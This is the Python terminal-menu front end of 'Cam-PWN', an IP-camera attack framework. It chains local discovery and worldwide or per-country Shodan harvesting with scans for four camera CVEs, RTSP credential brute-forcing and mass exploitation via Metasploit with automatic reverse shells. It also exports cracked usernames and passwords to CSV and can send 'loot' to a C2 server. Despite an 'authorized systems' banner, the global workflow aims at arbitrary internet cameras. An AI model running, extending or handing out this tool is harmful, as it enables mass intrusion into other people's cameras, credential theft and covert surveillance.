#!/usr/bin/env python3
"""
Cam-PWN TUI: Workflow-based menu. Run by goal (my network / global / full pipeline)
or single action. Use only on authorized systems.
"""

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import logging
logging.basicConfig(level=logging.WARNING, format="%(message)s")
log = logging.getLogger("cam_pwn")
log.setLevel(logging.INFO)

try:
    from cam_pwn.ui_colors import g, y, r, c, sep, format_vuln_count
except ImportError:
    g = y = r = c = lambda x: x
    sep = lambda: "  " + "-" * 54
    format_vuln_count = str


def get_mode_flags():
    """Read mode/safe_mode from config.yaml."""
    from cam_pwn.config import get

    mode = (get("mode", "normal") or "normal").lower()
    safe = bool(get("safe_mode", False))
    return mode, safe


def get_current_project():
    """Current project for filtering (env CAM_PWN_PROJECT or config). None = all."""
    from cam_pwn.config import get_current_project as _get
    return _get()


def banner():
    print()
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║           Cam-PWN  —  IP Camera Pentest Framework        ║")
    print("  ║         (Use only on authorized systems) by El_mylw V1.0 ║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    try:
        from cam_pwn.db.models import init_db, get_session, Camera
        init_db()
        session = get_session()
        q = session.query(Camera)
        if get_current_project() is not None:
            q = q.filter(Camera.project == get_current_project())
        cams = q.all()
        total = len(cams)
        vulns = sum(1 for c in cams if c.vulns and c.vulns.strip())
        creds = sum(1 for c in cams if c.credentials and c.credentials.strip())
        session.close()
        print("  " + g(f"Cameras: {total}") + " | " + y(f"Vulns: {vulns}") + " | " + c(f"With creds: {creds}"))
    except Exception:
        print("  Cameras: - | Vulns: - | With creds: -")
    print("  CVEs: CVE-2017-7921, CVE-2018-9995, CVE-2021-36260, CVE-2020-25078")
    print("  Proxy/Tor | PDF [f] | REST API | Payloads [m] | Health [H] | Config [c]")
    proj = get_current_project()
    if proj:
        print("  Project: " + g(proj))
    print()


def show_my_ips():
    from cam_pwn.network_utils import get_local_ips, get_public_ip
    local = get_local_ips()
    public = get_public_ip()
    print("  Your IPs:")
    for ip in local:
        print(f"    Local:  {ip}")
    if public:
        print(f"    Public: {public}")
    elif local:
        print("    Public: (could not fetch)")
    else:
        print("    (none detected)")
    print()


def pause():
    input("  Press Enter to continue...")


# ---------- Workflow 1: My network only ----------
def workflow_my_network():
    """Find cams on my LAN → CVE scan → optional brute → optional reverse shell."""
    from cam_pwn.discovery import discover_and_store
    from cam_pwn.mass_exploit import mass_cve_scan, mass_exploit
    from cam_pwn.rtsp_bruteforce import run_rtsp_bruteforce_on_db
    from cam_pwn.config import get

    mode, safe = get_mode_flags()
    print(f"  --- Workflow: My network (mode={mode}, safe_mode={safe}) ---")
    show_my_ips()
    default_workers = 20 if mode == "stealth" else (100 if mode == "aggressive" else 50)
    workers_in = input(f"  Scan workers [{default_workers}]: ").strip() or str(default_workers)
    try:
        workers = int(workers_in)
    except ValueError:
        workers = default_workers

    print("  [1/4] Discovering cameras on your network...")
    n = discover_and_store(networks=None, max_workers=workers)
    log.info("  Discovered %d new cameras.", n)

    print("  [2/4] Running CVE checks (CVE-2017-7921, CVE-2018-9995, CVE-2021-36260, CVE-2020-25078)...")
    results = mass_cve_scan(camera_ids=None, max_workers=min(20, workers), project=get_current_project())
    vuln = [r for r in results if r.get("vulns")]
    print("  " + g(f"Cameras with vulns: {format_vuln_count(len(vuln))}"))
    for row in vuln[:15]:
        vc = len(row.get("vulns", []))
        col = y if vc else g
        print("    " + col(f"{row.get('ip')} -> {row.get('vulns')}"))
    if len(vuln) > 15:
        print("    " + y(f"... and {len(vuln) - 15} more"))

    do_brute = (not safe) and input("  [3/4] Run RTSP brute-force on found cams? [y/N]: ").strip().lower() == "y"
    if safe and do_brute:
        print("  Safe mode is ON -> brute-force skipped.")
    if do_brute and not safe:
        run_rtsp_bruteforce_on_db(camera_ids=None, wordlist_path=None, project=get_current_project())
        log.info("  Brute-force done.")

    do_exploit = (not safe) and input("  [4/4] Try exploit / reverse shell on vulnerable? (needs Metasploit) [y/N]: ").strip().lower() == "y"
    if safe and do_exploit:
        print("  Safe mode is ON -> exploits skipped.")
    if do_exploit and not safe:
        results = mass_exploit("rfi", camera_ids=None, max_workers=10, project=get_current_project())
        ok = [r for r in results if r.get("success")]
        log.info("  Exploits successful: %d", len(ok))
    print("  " + sep())
    print("  " + g("My network workflow done."))
    print("  " + sep())
    pause()


# ---------- Workflow 2: Global / by country (Shodan) ----------
def workflow_global():
    """Shodan (need API key) → store → CVE → brute → report."""
    from cam_pwn.config import get
    mode, safe = get_mode_flags()
    api_key = os.environ.get("CAM_PWN_SHODAN_KEY") or get("shodan.api_key")
    if not api_key:
        api_key = input("  Shodan API key (from https://account.shodan.io): ").strip()
        if not api_key:
            print("  No API key. Skipping Shodan.")
            pause()
            return
    os.environ["CAM_PWN_SHODAN_KEY"] = api_key

    from cam_pwn.shodan_client import ShodanClient
    from cam_pwn.mass_exploit import mass_cve_scan
    from cam_pwn.rtsp_bruteforce import run_rtsp_bruteforce_on_db
    from cam_pwn.reporting import generate_html_report

    country = input("  Country code filter (e.g. GR, DE) or Enter for worldwide: ").strip() or None
    default_limit = 200 if mode == "stealth" else (1500 if mode == "aggressive" else 500)
    limit_in = input(f"  Max results per query [{default_limit}]: ").strip() or str(default_limit)
    try:
        limit = int(limit_in)
    except ValueError:
        limit = default_limit

    print("  [1/4] Shodan search & store...")
    client = ShodanClient(api_key)
    n = client.search_and_store(queries=None, country=country, limit_per_query=limit)
    log.info("  Stored %d cameras from Shodan.", n)

    print("  [2/4] CVE scan...")
    mass_cve_scan(camera_ids=None, max_workers=10 if mode == "stealth" else 20, project=get_current_project())
    print("  [3/4] RTSP brute-force...")
    if safe:
        print("  Safe mode is ON -> brute-force skipped.")
    else:
        run_rtsp_bruteforce_on_db(camera_ids=None, wordlist_path=None, project=get_current_project())
    print("  [4/4] Generating report...")
    path = generate_html_report(output_path=None, camera_ids=None, title="Shodan Camera Assessment", project=get_current_project())
    print("  " + g("Report: ") + path)
    print("  " + sep())
    print("  " + g("Global workflow done."))
    print("  " + sep())
    pause()


# ---------- Workflow 3: Full pipeline ----------
def workflow_full():
    """Local discovery + (optional Shodan) + CVE + brute + exploit + report. Find everything, get in where possible."""
    from cam_pwn.discovery import discover_and_store
    from cam_pwn.network_utils import get_local_ips, get_public_ip
    from cam_pwn.config import get
    from cam_pwn.mass_exploit import mass_cve_scan, mass_exploit
    from cam_pwn.rtsp_bruteforce import run_rtsp_bruteforce_on_db
    from cam_pwn.reporting import generate_html_report, get_statistics

    mode, safe = get_mode_flags()
    print(f"  --- Full pipeline: local + optional Shodan + CVE + brute + exploit + report (mode={mode}, safe_mode={safe}) ---")
    show_my_ips()

    print("  [1/6] Local discovery...")
    workers = 20 if mode == "stealth" else (80 if mode == "aggressive" else 50)
    n_local = discover_and_store(networks=None, max_workers=workers)
    log.info("  Local: %d new cameras.", n_local)

    api_key = os.environ.get("CAM_PWN_SHODAN_KEY") or get("shodan.api_key")
    if not api_key:
        api_key = input("  Shodan API key (or Enter to skip): ").strip()
        if api_key:
            os.environ["CAM_PWN_SHODAN_KEY"] = api_key
    if api_key:
        print("  [2/6] Shodan search & store...")
        from cam_pwn.shodan_client import ShodanClient
        client = ShodanClient(api_key)
        n_s = client.search_and_store(queries=None, country=None, limit_per_query=500)
        log.info("  Shodan: %d cameras.", n_s)
    else:
        print("  [2/6] Shodan skipped (no API key).")

    print("  [3/6] CVE scan on all in DB...")
    mass_cve_scan(camera_ids=None, max_workers=10 if mode == "stealth" else 20, project=get_current_project())
    print("  [4/6] RTSP brute-force...")
    if safe:
        print("  Safe mode is ON -> brute-force skipped.")
    else:
        run_rtsp_bruteforce_on_db(camera_ids=None, wordlist_path=None, project=get_current_project())
    print("  [5/6] Run exploits where possible...")
    if safe:
        print("  Safe mode is ON -> exploits skipped.")
    else:
        mass_exploit("rfi", camera_ids=None, max_workers=10 if mode != "stealth" else 5, project=get_current_project())
    print("  [6/6] Report...")
    path = generate_html_report(output_path=None, camera_ids=None, title="Full Pipeline Assessment", project=get_current_project())
    s = get_statistics(project=get_current_project())
    print("  " + g(f"Total cameras: {s['total']}") + " | Report: " + path)
    print("  " + sep())
    print("  " + g("Full pipeline done."))
    print("  " + sep())
    pause()


# ---------- Single actions (legacy menu) ----------
def menu_single():
    return """
  [1] Discover local      [2] Shodan      [3] CVE scan      [4] Brute
  [5] Exploit             [6] Report      [7] Stats         [8] Burp  [9] ZAP
  [v] View cameras+links  [x] Export IPs/creds  [f] Export report to PDF
  [m] Metasploit by CVE   [s] Start MSF RPC   [k] Health check  [c] Config check  [h] Help
  [0] Show my IPs         [b] Back to main menu
"""


def run_discover():
    from cam_pwn.discovery import discover_and_store
    show_my_ips()
    workers = input("  Workers [50]: ").strip() or "50"
    try:
        workers = int(workers)
    except ValueError:
        workers = 50
    n = discover_and_store(networks=None, max_workers=workers)
    log.info("Discovered %d new cameras.", n)
    pause()


def run_shodan():
    from cam_pwn.config import get
    api_key = os.environ.get("CAM_PWN_SHODAN_KEY") or get("shodan.api_key")
    if not api_key:
        api_key = input("  Shodan API key: ").strip()
        if api_key:
            os.environ["CAM_PWN_SHODAN_KEY"] = api_key
    if not api_key:
        print("  No API key.")
        pause()
        return
    from cam_pwn.shodan_client import ShodanClient
    client = ShodanClient(api_key)
    limit = input("  Max results [500]: ").strip() or "500"
    try:
        limit = int(limit)
    except ValueError:
        limit = 500
    n = client.search_and_store(queries=None, country=None, limit_per_query=limit)
    log.info("Stored %d cameras.", n)
    pause()


def run_cve():
    from cam_pwn.mass_exploit import mass_cve_scan
    print("  Checking: CVE-2017-7921, CVE-2018-9995, CVE-2021-36260, CVE-2020-25078 (timeout from config).")
    results = mass_cve_scan(camera_ids=None, max_workers=20, project=get_current_project())
    vuln = [r for r in results if r.get("vulns")]
    print("  " + sep())
    print("  " + g("Cameras with vulns: ") + format_vuln_count(len(vuln)))
    for row in vuln[:15]:
        print("    " + y(f"{row.get('ip')} -> {row.get('vulns')}"))
    if len(vuln) > 15:
        print("    " + y(f"... +{len(vuln) - 15} more"))
    print("  " + sep())
    pause()


def run_brute():
    from cam_pwn.rtsp_bruteforce import run_rtsp_bruteforce_on_db
    mode, safe = get_mode_flags()
    if safe:
        print("  Safe mode is ON -> brute-force disabled.")
        pause()
        return
    print("  Filter: only cameras with RTSP port and no existing credentials.")
    n = run_rtsp_bruteforce_on_db(camera_ids=None, wordlist_path=None, project=get_current_project())
    log.info("Credentials on %d cameras.", n)
    pause()


def run_exploit():
    from cam_pwn.mass_exploit import mass_exploit
    mode, safe = get_mode_flags()
    if safe:
        print("  Safe mode is ON -> exploits disabled.")
        pause()
        return
    name = input("  Exploit (rfi / rtsp_buffer_overflow / firmware_extraction / path_traversal) [rfi]: ").strip() or "rfi"
    only_cve_in = input("  Limit to CVE (2017-7921, 2018-9995, 2021-36260, 2020-25078 or 'all') [CVE-2017-7921]: ").strip()
    only_cve = only_cve_in if only_cve_in else "CVE-2017-7921"
    if only_cve.lower() in ("all", "none", "-"):
        only_cve = None
    elif only_cve and not only_cve.startswith("CVE-"):
        only_cve = f"CVE-{only_cve}" if only_cve.replace("-", "").isdigit() else only_cve
    workers = 5 if mode == "stealth" else 10
    results = mass_exploit(name, camera_ids=None, max_workers=workers, only_cve=only_cve, project=get_current_project())
    ok = [r for r in results if r.get("success")]
    log.info("Successful: %d", len(ok))
    pause()


def run_report():
    from cam_pwn.reporting import generate_html_report
    path = generate_html_report(output_path=None, camera_ids=None, title="IP Camera Assessment", project=get_current_project())
    log.info("Report: %s", path)
    pause()


def run_report_pdf():
    """Generate HTML report then export to PDF (requires weasyprint)."""
    from cam_pwn.reporting import export_report_to_pdf
    path = export_report_to_pdf(html_path=None, project=get_current_project(), title="IP Camera Assessment")
    if path:
        log.info("PDF report: %s", path)
    else:
        print("  PDF export failed. Install: pip install weasyprint")
    pause()


def run_stats():
    from cam_pwn.reporting import get_statistics
    s = get_statistics(project=get_current_project())
    print("  " + sep())
    print("  " + g("Total: ") + str(s["total"]) + " | " + g("By country: ") + str(s.get("by_country")) + " | " + y("Honeypots: ") + str(s.get("honeypot_count", 0)))
    print("  " + sep())
    pause()


def view_cameras_links():
    """Quick view: cameras + HTTP / RTSP links + payload tiles (by CVE) when vulns present."""
    from cam_pwn.db.models import get_session, Camera, init_db
    from cam_pwn.payloads import build_native_tiles_for_vulns
    import json as _json

    init_db()
    session = get_session()
    try:
        q = session.query(Camera).order_by(Camera.id.asc()).limit(100)
        if get_current_project() is not None:
            q = q.filter(Camera.project == get_current_project())
        cams = q.all()
        if not cams:
            print("  No cameras in database yet.")
            pause()
            return
        print("  ID | IP:Port           | Web UI                    | RTSP")
        print("  ---------------------------------------------------------------")
        for c in cams:
            http = f"http://{c.ip}:{c.port}/"
            rtsp = c.rtsp_url or "-"
            print(f"  {c.id:3d} | {c.ip}:{c.port:<15} | {http:<24} | {rtsp}")
        # Payload tiles for cams with vulns
        with_vulns = [c for c in cams if c.vulns]
        if with_vulns:
            print("\n  --- Ready payloads (by CVE) ---")
            for c in with_vulns[:20]:
                try:
                    vulns = _json.loads(c.vulns) if isinstance(c.vulns, str) else (c.vulns or [])
                except Exception:
                    vulns = []
                tiles = build_native_tiles_for_vulns(vulns, c.ip, c.port or 80, use_ssl=False)
                for t in tiles[:5]:
                    print(f"    [{c.ip}] {t['name']} ({t.get('cve','')}): {t['url']}")
    finally:
        session.close()
    pause()


def export_ips_and_creds():
    """Export IP list and credentials to files (filtered by current project)."""
    from cam_pwn.db.models import get_session, Camera, init_db
    from cam_pwn.config import get
    import json as _json
    from pathlib import Path as _Path

    init_db()
    session = get_session()
    try:
        q = session.query(Camera)
        if get_current_project() is not None:
            q = q.filter(Camera.project == get_current_project())
        cams = q.all()
        if not cams:
            print("  No cameras in database.")
            pause()
            return
        from cam_pwn.kali_paths import get_reports_dir
        out_dir = _Path(get_reports_dir()).parent / "exports"
        out_dir.mkdir(parents=True, exist_ok=True)
        ips_path = out_dir / "ips.txt"
        creds_path = out_dir / "credentials.csv"
        with ips_path.open("w", encoding="utf-8") as f_ips, creds_path.open("w", encoding="utf-8") as f_creds:
            f_creds.write("id,ip,port,user,pass\n")
            for c in cams:
                f_ips.write(f"{c.ip}:{c.port or 80}\n")
                if c.credentials:
                    try:
                        cred = _json.loads(c.credentials)
                    except Exception:
                        cred = {}
                    if cred.get("user") and cred.get("pass"):
                        f_creds.write(f"{c.id},{c.ip},{c.port or 80},{cred['user']},{cred['pass']}\n")
        print(f"  Exported IPs to {ips_path}")
        print(f"  Exported credentials to {creds_path}")
    finally:
        session.close()
    pause()


def menu_project():
    """New / Load / Show / Clear project. Sets CAM_PWN_PROJECT so all actions filter by it."""
    from cam_pwn.db.models import init_db, get_session, Camera

    print("  --- Project ---")
    print("  [1] New project   (type name, new scans will be tagged)")
    print("  [2] Load project (choose from existing)")
    print("  [3] Show current")
    print("  [4] Clear (work on all cameras)")
    sub = input("  Choice [1-4]: ").strip()
    if sub == "1":
        name = input("  Project name (e.g. client_x_gr): ").strip()
        if name:
            os.environ["CAM_PWN_PROJECT"] = name
            print(f"  Set project to: {name}")
        else:
            print("  Cancelled.")
    elif sub == "2":
        init_db()
        session = get_session()
        try:
            rows = session.query(Camera.project).distinct().all()
            projects = [r[0] for r in rows if r[0]]
            if not projects:
                print("  No projects in DB yet. Use 'New project' then run discover/shodan.")
                pause()
                return
            print("  Existing projects:")
            for i, p in enumerate(projects, 1):
                print(f"    {i}) {p}")
            idx = input(f"  Number [1-{len(projects)}]: ").strip()
            try:
                k = int(idx)
                if 1 <= k <= len(projects):
                    os.environ["CAM_PWN_PROJECT"] = projects[k - 1]
                    print(f"  Loaded project: {projects[k - 1]}")
                else:
                    print("  Invalid.")
            except ValueError:
                print("  Invalid.")
        finally:
            session.close()
    elif sub == "3":
        p = get_current_project()
        print(f"  Current project: {p or '(all)'}")
    elif sub == "4":
        if "CAM_PWN_PROJECT" in os.environ:
            del os.environ["CAM_PWN_PROJECT"]
        print("  Cleared. Actions will use all cameras.")
    else:
        print("  Invalid.")
    pause()


def run_msf_for_cve():
    """Run Metasploit module auto-selected by CVE (payload from vulnerability)."""
    from cam_pwn.metasploit_client import MetasploitClient
    from cam_pwn.payloads import get_metasploit_module_for_cve
    from cam_pwn.db.models import get_session, Camera, init_db
    import json as _json

    mode, safe = get_mode_flags()
    if safe:
        print("  Safe mode is ON -> Metasploit disabled.")
        pause()
        return
    init_db()
    session = get_session()
    try:
        q = session.query(Camera).filter(Camera.vulns.isnot(None)).filter(Camera.vulns != "")
        if get_current_project() is not None:
            q = q.filter(Camera.project == get_current_project())
        cams = q.limit(50).all()
    finally:
        session.close()
    if not cams:
        print("  No cameras with stored CVE results. Run CVE scan first.")
        pause()
        return
    print("  Cameras with vulns (first 20):")
    for i, c in enumerate(cams[:20]):
        try:
            v = _json.loads(c.vulns) if isinstance(c.vulns, str) else []
        except Exception:
            v = []
        print(f"    [{c.id}] {c.ip}:{c.port or 80}  vulns: {v}")
    cam_id_in = input("  Camera ID to exploit (or Enter = first): ").strip()
    cam_id = int(cam_id_in) if cam_id_in else cams[0].id
    cam = next((c for c in cams if c.id == cam_id), None)
    if not cam:
        print("  Camera not found.")
        pause()
        return
    try:
        vulns = _json.loads(cam.vulns) if isinstance(cam.vulns, str) else []
    except Exception:
        vulns = []
    cve_id = None
    for v in vulns:
        if get_metasploit_module_for_cve(v):
            cve_id = v
            break
    if not cve_id:
        print("  No Metasploit module for this camera's CVEs. Use custom exploit or add module in cam_pwn.payloads.")
        pause()
        return
    print(f"  Using CVE: {cve_id} -> running mapped Metasploit module (reverse shell payload auto for RCE).")
    try:
        from cam_pwn.msfrpcd_launcher import ensure_msfrpcd_running
        if not ensure_msfrpcd_running():
            print("  " + r("Metasploit RPC not running. Set exploitation.metasploit_rpc_pass in config.yaml and install Metasploit."))
            pause()
            return
        client = MetasploitClient()
        out = client.run_exploit_for_cve(cve_id, cam.ip, cam.port or 80)
        if out.get("success"):
            print("  Success. Session:", out.get("session_id"), "|", out.get("result", "")[:200])
        else:
            print("  Failed:", out.get("error", "unknown"))
    except Exception as e:
        log.exception("MSF: %s", e)
    pause()


def run_start_msfrpcd():
    """Auto-start Metasploit RPC daemon in background if not running."""
    from cam_pwn.msfrpcd_launcher import ensure_msfrpcd_running
    from cam_pwn.config import get

    print("  " + sep())
    print("  " + g("Start Metasploit RPC (msfrpcd)"))
    print("  " + sep())
    passwd = get("exploitation.metasploit_rpc_pass") or os.environ.get("CAM_PWN_MSF_PASS")
    if not passwd:
        print("  " + r("Set exploitation.metasploit_rpc_pass in config.yaml or CAM_PWN_MSF_PASS first."))
        print("  " + sep())
        pause()
        return
    if ensure_msfrpcd_running():
        print("  " + g("Metasploit RPC is running."))
    else:
        print("  " + r("Failed. Install Metasploit, set password, ensure msfrpcd is in PATH."))
    print("  " + sep())
    pause()


def config_check():
    """Check Shodan key, proxy, Metasploit connection. Display OK/missing."""
    from cam_pwn.config import get
    from cam_pwn.http_client import get_proxies

    print("  " + sep())
    print("  " + g("Config Check"))
    print("  " + sep())
    # Shodan
    api_key = os.environ.get("CAM_PWN_SHODAN_KEY") or get("shodan.api_key") or ""
    if api_key and len(api_key) > 10:
        print("  Shodan API key:  " + g("OK"))
    else:
        print("  Shodan API key:  " + r("missing") + " (set CAM_PWN_SHODAN_KEY or shodan.api_key)")
    # Proxy
    proxies = get_proxies()
    if proxies:
        print("  Proxy:           " + g("OK") + f" ({list(proxies.keys())})")
    else:
        print("  Proxy:           " + g("-") + " (optional, set proxy.url in config)")
    # Metasploit (silent check - no connection error spam)
    try:
        import logging as _log
        _o1, _o2 = _log.getLogger("urllib3").level, _log.getLogger("requests").level
        _log.getLogger("urllib3").setLevel(_log.CRITICAL)
        _log.getLogger("requests").setLevel(_log.CRITICAL)
        try:
            from cam_pwn.metasploit_client import MetasploitClient
            MetasploitClient().client
            print("  Metasploit RPC:  " + g("OK"))
        except Exception:
            print("  Metasploit RPC:  " + r("unavailable") + " (run msfrpcd on port 55553)")
        finally:
            _log.getLogger("urllib3").setLevel(_o1)
            _log.getLogger("requests").setLevel(_o2)
    except Exception:
        print("  Metasploit RPC:  " + r("unavailable"))
    print("  " + sep())
    pause()


def run_health_check():
    """Ping cameras from DB; show alive vs dead (colored)."""
    from cam_pwn.health_check import health_check_cameras

    print("  " + sep())
    print("  " + g("Health Check (ping cameras)"))
    print("  " + sep())
    res = health_check_cameras(project=get_current_project())
    alive = res["alive"]
    dead = res["dead"]
    total = res["total"]
    print("  " + g(f"Alive: {len(alive)}") + "  |  " + (r(f"Dead: {len(dead)}") if dead else g("Dead: 0")) + f"  |  Total: {total}")
    if alive:
        print("  " + g("Alive: ") + ", ".join(f"{ip}:{p}" for ip, p in alive[:20]))
        if len(alive) > 20:
            print("  " + g("  ...") + f" +{len(alive) - 20} more")
    if dead and len(dead) <= 15:
        print("  " + r("Dead:  ") + ", ".join(f"{ip}:{p}" for ip, p in dead))
    elif dead:
        print("  " + r("Dead:  ") + ", ".join(f"{ip}:{p}" for ip, p in dead[:10]) + f" ... +{len(dead) - 10} more")
    print("  " + sep())
    pause()


def helper_msf_c2():
    """Show quick instructions. Use [c] for config check."""
    from cam_pwn.config import get

    print("  --- Metasploit / C2 helper ---")
    print("  Metasploit RPC:")
    print("    1) In another terminal run:")
    print("       msfrpcd -P <password> -S -a 127.0.0.1 -p 55553")
    print("    2) Set CAM_PWN_MSF_PASS=<password> or exploitation.metasploit_rpc_pass in config.yaml")
    print("    3) Use [m] MSF by CVE: framework picks the right module from the vulnerability.")
    print("    4) Reverse shell: used automatically for exploit modules (e.g. CVE-2021-36260).")
    print("")
    print("  Payloads: CVE -> module in cam_pwn.payloads. RCE CVEs get reverse shell payload auto.")
    print("  C2 (optional):")
    print("    - Set c2.enabled: true, c2.endpoint: https://your-c2, c2.api_key in config.yaml")
    print("    - The framework will be able to send loot via cam_pwn.c2_client.C2Client.")
    pause()


def run_burp():
    from cam_pwn.integrations import send_to_burp
    n = send_to_burp(camera_ids=None, project=get_current_project())
    log.info("Sent %d URLs to Burp.", n)
    pause()


def run_zap():
    from cam_pwn.integrations import send_to_zap
    n = send_to_zap(camera_ids=None, project=get_current_project())
    log.info("Sent %d URLs to ZAP.", n)
    pause()


def _startup_config_line():
    """One-line config status at startup. MSF check is silent (no connection errors printed)."""
    from cam_pwn.config import get
    from cam_pwn.http_client import get_proxies
    parts = []
    api = os.environ.get("CAM_PWN_SHODAN_KEY") or get("shodan.api_key") or ""
    parts.append("Shodan:" + (g("OK") if api and len(api) > 5 else r("missing")))
    parts.append("Proxy:" + (g("on") if get_proxies() else g("-")))
    try:
        import logging as _log
        _old1 = _log.getLogger("urllib3").level
        _old2 = _log.getLogger("requests").level
        _log.getLogger("urllib3").setLevel(_log.CRITICAL)
        _log.getLogger("requests").setLevel(_log.CRITICAL)
        try:
            from cam_pwn.metasploit_client import MetasploitClient
            MetasploitClient().client
            parts.append("MSF:" + g("OK"))
        except Exception:
            parts.append("MSF:" + r("off"))
        finally:
            _log.getLogger("urllib3").setLevel(_old1)
            _log.getLogger("requests").setLevel(_old2)
    except Exception:
        parts.append("MSF:" + r("off"))
    print("  " + "  ".join(parts))
    print()


def main():
    banner()
    _startup_config_line()
    main_menu = """
  What do you want to do?

  [1] My network only     — Find cams on my LAN, check vulns, optional reverse shell
  [2] Global / country   — Shodan (API key) → find vuln cams in country/world → report
  [3] Full pipeline       — Local + Shodan + CVE + brute + exploit + report (all-in-one)
  [4] Single action      — Choose one step (discover / shodan / cve / brute / report / …)
  [p] Project            — New / Load / Show / Clear (filter all actions by project)
  [0] Show my IPs        [q] Quit

  Select [1-4, p, 0, q]: """

    single_actions = {
        "1": run_discover,
        "2": run_shodan,
        "3": run_cve,
        "4": run_brute,
        "5": run_exploit,
        "6": run_report,
        "7": run_stats,
        "8": run_burp,
        "9": run_zap,
        "v": view_cameras_links,
        "x": export_ips_and_creds,
        "f": run_report_pdf,
        "m": run_msf_for_cve,
        "s": run_start_msfrpcd,
        "k": run_health_check,
        "c": config_check,
        "h": helper_msf_c2,
        "0": lambda: (show_my_ips(), pause()),
    }

    while True:
        choice = input(main_menu).strip().lower()
        if choice == "q":
            print("  Bye.")
            break
        if choice == "0":
            show_my_ips()
            pause()
            continue
        if choice == "1":
            try:
                workflow_my_network()
            except Exception as e:
                log.exception("%s", e)
                pause()
            continue
        if choice == "2":
            try:
                workflow_global()
            except Exception as e:
                log.exception("%s", e)
                pause()
            continue
        if choice == "3":
            try:
                workflow_full()
            except Exception as e:
                log.exception("%s", e)
                pause()
            continue
        if choice == "4":
            while True:
                print(menu_single())
                sub = input("  Choice [b=back]: ").strip().lower()
                if sub == "b":
                    break
                if sub in single_actions:
                    try:
                        single_actions[sub]()
                    except Exception as e:
                        log.exception("%s", e)
                        pause()
                else:
                    print("  Invalid.")
            continue
        if choice == "p":
            try:
                menu_project()
            except Exception as e:
                log.exception("%s", e)
                pause()
            continue
        print("  Invalid option.")


if __name__ == "__main__":
    main()
